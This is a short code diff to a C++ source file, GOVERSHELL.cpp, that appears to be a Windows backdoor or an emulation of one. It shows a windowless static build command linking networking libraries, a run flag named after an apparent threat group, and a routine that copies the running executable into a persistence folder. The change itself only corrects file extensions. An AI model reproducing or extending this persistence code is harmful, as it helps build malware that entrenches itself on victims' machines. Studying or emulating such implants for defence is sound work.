@@ -1,6 +1,6 @@
 // Compile: x86_64-w64-mingw32-g++ -std=c++17 -o  GOVERSHELL.exe  GOVERSHELL.cpp -static -lwinhttp -lws2_32 -lgdi32 -mwindows -lole32 -loleaut32
 
-// Execution: GOVERSHELL -SilentChollima
+// Execution: GOVERSHELL.exe -SilentChollima
 
 #include <windows.h>
 #include <winhttp.h>
@@ -127,7 +127,7 @@ bool create_persistence_dir() {
 }
 
 bool copy_to_persistence() {
-    full_exe_path = persist_dir + "\\ GOVERSHELL";
+    full_exe_path = persist_dir + "\\ GOVERSHELL.exe";
     std::ifstream src(get_module_path(), std::ios::binary);
     if (!src) return false;
     std::ofstream dst(full_exe_path, std::ios::binary);
